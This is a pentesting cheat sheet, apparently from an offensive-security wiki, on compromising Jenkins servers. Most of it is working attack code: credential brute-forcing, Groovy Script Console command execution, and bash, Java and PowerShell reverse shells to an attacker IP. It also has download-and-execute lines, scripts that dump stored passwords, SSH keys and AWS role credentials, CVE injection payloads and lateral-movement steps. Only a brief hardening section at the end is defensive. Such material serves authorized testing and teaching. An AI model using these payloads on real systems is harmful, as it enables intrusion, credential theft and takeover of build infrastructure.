# Jenkins

### Overview

**Jenkins** is an open-source automation server used for continuous integration and continuous delivery (CI/CD). It automates building, testing, and deploying applications, making it a critical component in modern development pipelines.

**Why Jenkins matters in security:**

* Often runs with elevated privileges
* Has access to source code repositories
* Stores sensitive credentials (API keys, passwords, SSH keys)
* Can execute arbitrary code on multiple systems
* Frequently exposed to internal networks or internet

**Key Components:**

* **Master/Controller** - Main Jenkins server managing jobs
* **Agents/Slaves** - Worker nodes executing builds
* **Jobs/Projects** - Automated tasks and pipelines
* **Plugins** - Extensions adding functionality

**Default Ports:**

* **8080/TCP** - Web interface (Tomcat)
* **5000/TCP** - Agent communication
* **50000/TCP** - JNLP agent port (alternative)

***

### Exploitation Workflow Summary

```
1. Discovery & Reconnaissance
   ├─ Port scanning (8080, 5000)
   ├─ Version identification
   ├─ Plugin enumeration
   └─ Authentication status check

2. Initial Access
   ├─ Default credentials (admin:admin)
   ├─ Open registration exploitation
   ├─ Anonymous access testing
   └─ Known CVE exploitation

3. Code Execution (Admin Access)
   ├─ Script Console (Groovy)
   ├─ System command execution
   ├─ Reverse shell deployment
   └─ Credential extraction

4. Code Execution (Limited Access)
   ├─ Build configuration modification
   ├─ Build step injection
   ├─ Pipeline script exploitation
   └─ Plugin abuse

5. Post-Exploitation
   ├─ Credential harvesting
   ├─ Source code access
   ├─ Cloud credential extraction (AWS/Azure)
   └─ Lateral movement to build agents
```

***

### Initial Discovery

#### Port Identification

**Nmap scan:**

```bash
nmap -sV -sC -p8080,5000,50000 10.10.10.10
```

**Expected services:**

```
8080/tcp  open  http    Jetty 9.4.x
5000/tcp  open  upnp?   (Jenkins agent port)
50000/tcp open  unknown (JNLP agent)
```

#### Version Detection

**Access Jenkins:**

```bash
curl http://jenkins.target.com:8080/
```

**Version information locations:**

```
/login        - Login page (shows version in footer)
/api/json     - API endpoint with version info
/oops         - Error page with version details
```

#### Common Jenkins Paths

```
/                      Main dashboard
/login                 Login page
/signup                User registration
/script                Script Console (admin only)
/configure             System configuration
/configureSecurity/    Security settings
/systemInfo            System information
/asynchPeople/         User directory
/credentials/          Stored credentials
```

***

### Authentication Testing

#### Default Credentials

**Common defaults:**

```
admin:admin
admin:password
jenkins:jenkins
admin:jenkins
root:root
```

**Testing:**

```bash
# Manual test
curl -X POST http://jenkins.target.com:8080/j_acegi_security_check \
  -d "j_username=admin&j_password=admin"

# With hydra
hydra -l admin -P passwords.txt jenkins.target.com http-post-form \
  "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^:Invalid"
```

#### Open Registration

**Check for open signup:**

```
http://jenkins.target.com:8080/signup
http://jenkins.target.com:8080/jenkins/signup
```

**If registration is open:**

1. Create new account
2. Login with created credentials
3. Check permissions
4. Attempt privilege escalation

**Example:**

```bash
# Create account via web interface
curl http://jenkins.target.com:8080/signup

# Or via API
curl -X POST http://jenkins.target.com:8080/user/signup \
  -d "username=attacker&password=Password123!&email=test@test.com"
```

#### Anonymous Access

**Test for unauthenticated access:**

```bash
# Check dashboard
curl http://jenkins.target.com:8080/

# Check API
curl http://jenkins.target.com:8080/api/json

# Check jobs
curl http://jenkins.target.com:8080/job/
```

**What to look for:**

* Can view jobs without login
* Can access build configurations
* Can view console output
* Can trigger builds

***

### Script Console Exploitation (Admin Access)

#### Understanding Script Console

**Location:** `http://jenkins.target.com:8080/script`

**What it is:**

* Groovy script interpreter
* Runs with Jenkins system privileges
* Direct access to Java runtime
* Can execute OS commands
* **Requires admin access** (pre-2.0 versions)

#### Command Execution

**Linux command execution:**

```groovy
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```

**Parameters explained:**

* `def cmd = 'id'` - Command to execute
* `StringBuffer()` - Captures output
* `execute()` - Runs the command
* `consumeProcessOutput()` - Reads stdout/stderr
* `waitForOrKill(1000)` - Wait 1 second max

**Windows command execution:**

```groovy
def cmd = "cmd.exe /c dir".execute();
println("${cmd.text}");
```

**More complex commands:**

```groovy
// List directory
def cmd = "ls -la /etc".execute()
println cmd.text

// Read file
def cmd = "cat /etc/passwd".execute()
println cmd.text

// Check user
def cmd = "whoami".execute()
println cmd.text
```

#### Reverse Shell

**Linux reverse shell (Bash):**

```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/4444;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

**Setup listener:**

```bash
nc -lvnp 4444
```

**Expected result:**

```bash
listening on [any] 4444 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.10.10] 57844

id
uid=0(root) gid=0(root) groups=0(root)
```

**Windows reverse shell:**

```groovy
String host="10.10.14.15";
int port=4444;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){
    while(pi.available()>0)so.write(pi.read());
    while(pe.available()>0)so.write(pe.read());
    while(si.available()>0)po.write(si.read());
    so.flush();
    po.flush();
    Thread.sleep(50);
    try {p.exitValue();break;}catch (Exception e){}
};
p.destroy();
s.close();
```

**PowerShell reverse shell (more reliable):**

```groovy
def cmd = "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.15/shell.ps1')\"".execute()
println cmd.text
```

***

### Build Configuration Exploitation (Limited Access)

#### Understanding the Attack

**Scenario:**

* You don't have admin access
* You can create or edit build jobs
* Build steps execute with Jenkins privileges
* Can inject malicious commands

**Attack vector:** Modify build configuration to execute arbitrary commands during build process.

#### Windows Build Steps

**Navigate to job configuration:**

```
Dashboard → Job Name → Configure → Build → Add build step
```

**Add "Execute Windows Batch Command":**

```batch
whoami
hostname
ipconfig
```

**More advanced:**

```batch
powershell -c "whoami /all"
powershell -c "net user"
powershell -c "Get-ChildItem Env:"
```

**Download and execute payload:**

```batch
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.15/payload.ps1')"
```

**Reverse shell:**

```batch
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

#### Linux Build Steps

**Add "Execute Shell" build step:**

```bash
#!/bin/bash
id
hostname
cat /etc/passwd
```

**Reverse shell:**

```bash
bash -i >& /dev/tcp/10.10.14.15/4444 0>&1
```

**Download and execute:**

```bash
wget http://10.10.14.15/shell.sh -O /tmp/shell.sh
chmod +x /tmp/shell.sh
/tmp/shell.sh
```

#### Triggering the Build

**Manual trigger:**

* Click "Build Now" in web interface

**Automatic trigger:**

* Configure webhook trigger
* Use API to trigger build

**API trigger:**

```bash
curl -X POST http://jenkins.target.com:8080/job/JobName/build \
  --user username:password
```

***

### Credential Extraction

#### Jenkins Credentials Storage

**Where credentials are stored:**

* `/var/lib/jenkins/credentials.xml` (Linux)
* `C:\Program Files\Jenkins\credentials.xml` (Windows)
* Encrypted with master key
* Master key location: `/var/lib/jenkins/secrets/`

#### Script Console Credential Extraction

**Extract all credentials:**

```groovy
import jenkins.model.Jenkins
import com.cloudbees.plugins.credentials.CredentialsProvider
import com.cloudbees.plugins.credentials.common.StandardUsernamePasswordCredentials

def creds = CredentialsProvider.lookupCredentials(
    StandardUsernamePasswordCredentials.class,
    Jenkins.instance,
    null,
    null
)

creds.each {c ->
    println(c.id + ": " + c.username + " / " + c.password)
}
```

**Extract SSH keys:**

```groovy
import jenkins.model.Jenkins
import com.cloudbees.jenkins.plugins.sshcredentials.impl.BasicSSHUserPrivateKey

def creds = CredentialsProvider.lookupCredentials(
    BasicSSHUserPrivateKey.class,
    Jenkins.instance,
    null,
    null
)

creds.each {c ->
    println("ID: " + c.id)
    println("Username: " + c.username)
    println("Private Key: " + c.privateKey)
    println("---")
}
```

#### AWS Credential Extraction (Cloud Environments)

**If Jenkins runs on AWS EC2:**

```groovy
def tokenCommand = 'curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"'
def dataCommand = 'curl -H "X-aws-ec2-metadata-token: $TOKEN" -v http://169.254.169.254/latest/meta-data/iam/security-credentials/'

def proc1 = ['sh', '-c', tokenCommand].execute()
def token = proc1.text.trim()
proc1.waitFor()

if (proc1.exitValue() == 0) {
    def proc2 = ['sh', '-c', dataCommand.replace('$TOKEN', token)].execute()
    println(proc2.text)
} else {
    println("Failed to retrieve token")
}
```

**What this does:**

1. Obtains IMDSv2 token
2. Queries EC2 metadata service
3. Retrieves IAM role credentials
4. Can be used for AWS privilege escalation

***

### Known CVEs

#### CVE-2025-53652 - Git Parameter Command Injection

**Vulnerability:** Command injection through Git branch parameter in build configuration.

**Requirements:**

* Jenkins with Git Parameter plugin
* Ability to trigger builds
* Valid session and CSRF token

**Exploitation:**

```bash
# First, get CSRF token
CRUMB=$(curl -s 'http://jenkins:8080/crumbIssuer/api/json' \
  --cookie 'JSESSIONID=YOUR_SESSION' | jq -r '.crumb')

# Trigger build with injected command
curl -kv 'http://jenkins:8080/job/BuildName/build' -X POST \
  -H "Cookie: JSESSIONID=YOUR_SESSION;" \
  -H "Jenkins-Crumb: $CRUMB" \
  --data-urlencode 'json={"parameter":{"name":"BRANCH_PARAM","value":"$(bash -c \"bash &> /dev/tcp/10.10.14.15/4444 <&1\")"}}'
```

**Payload breakdown:**

```bash
$(bash -c "bash &> /dev/tcp/ATTACKER_IP/PORT <&1")
```

* `$()` - Command substitution
* `bash -c` - Execute bash command
* `&> /dev/tcp/IP/PORT` - Redirect to TCP connection
* Creates reverse shell

#### CVE-2024-23897 - Arbitrary File Read Leading to RCE

**Vulnerability:** Jenkins CLI allows reading arbitrary files from the controller filesystem.

**Exploitation:**

```bash
# Read /etc/passwd
java -jar jenkins-cli.jar -s http://jenkins:8080/ help "@/etc/passwd"

# Read Jenkins credentials
java -jar jenkins-cli.jar -s http://jenkins:8080/ help "@/var/lib/jenkins/credentials.xml"

# Read master key
java -jar jenkins-cli.jar -s http://jenkins:8080/ help "@/var/lib/jenkins/secrets/master.key"
```

**Escalation to RCE:**

1. Read credentials.xml
2. Read master.key and hudson.util.Secret
3. Decrypt credentials offline
4. Use credentials for authenticated access
5. Execute code via Script Console

#### CVE-2024-43044 - Agent File Read

**Vulnerability:** Jenkins agent can read arbitrary files from the controller.

**Requirements:**

* Access to Jenkins agent
* Agent-to-controller connection

**Impact:**

* Read sensitive files from controller
* Extract credentials
* Access source code repositories

***

### Metasploit Modules

#### Script Console Exploitation

```bash
use exploit/multi/http/jenkins_script_console
set RHOSTS jenkins.target.com
set RPORT 8080
set TARGETURI /
set USERNAME admin
set PASSWORD admin
set LHOST 10.10.14.15
set LPORT 4444
exploit
```

**What it does:**

1. Authenticates to Jenkins
2. Accesses Script Console
3. Uploads and executes payload
4. Establishes reverse connection

***

### Post-Exploitation

#### Credential Harvesting

**Check environment variables:**

```groovy
System.getenv().each { k, v -> println("${k} = ${v}") }
```

**Check Java properties:**

```groovy
System.getProperties().each { k, v -> println("${k} = ${v}") }
```

**Look for credentials in:**

```
/var/lib/jenkins/jobs/*/config.xml
/var/lib/jenkins/credentials.xml
/var/lib/jenkins/secrets/
~/.jenkins/credentials.xml
```

#### Source Code Access

**List jobs:**

```groovy
Jenkins.instance.getAllItems(Job.class).each { job ->
    println(job.name)
}
```

**Access Git repositories:**

```bash
# Find git configs
find /var/lib/jenkins -name ".git" -type d

# Extract repo URLs
grep -r "url =" /var/lib/jenkins/workspace/*/.git/config
```

#### Lateral Movement

**Enumerate build agents:**

```groovy
import jenkins.model.Jenkins
Jenkins.instance.getNodes().each { node ->
    println("Agent: " + node.getNodeName())
    println("Host: " + node.getLauncher().host)
    println("Credentials: " + node.getLauncher().credentialsId)
    println("---")
}
```

***

### Defense & Hardening

**Security best practices:**

* Disable anonymous access
* Enable authentication (LDAP/Active Directory)
* Use role-based access control (RBAC)
* Disable Script Console or restrict to admins only
* Enable CSRF protection
* Use credentials plugin for secrets management
* Encrypt credentials at rest
* Keep Jenkins and plugins updated
* Network segmentation (restrict agent access)
* Enable audit logging
* Use agent-to-controller security
* Implement least privilege for service accounts

**Detection:**

* Monitor Script Console usage
* Alert on job configuration changes
* Track credential access patterns
* Log API calls
* Monitor outbound connections from Jenkins
* Alert on unusual build execution patterns

***

### Quick Reference

#### Authentication Testing

```bash
# Default creds
curl -X POST http://jenkins:8080/j_acegi_security_check \
  -d "j_username=admin&j_password=admin"

# Check signup
curl http://jenkins:8080/signup
```

#### Script Console (Admin)

```groovy
# Command execution (Linux)
def cmd = "whoami".execute()
println cmd.text

# Command execution (Windows)
def cmd = "cmd /c whoami".execute()
println cmd.text

# Reverse shell (Linux)
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.15/4444 0>&1"] as String[])
```

#### Build Step Injection

```bash
# Windows batch
powershell -c "whoami"

# Linux shell
bash -i >& /dev/tcp/10.10.14.15/4444 0>&1
```



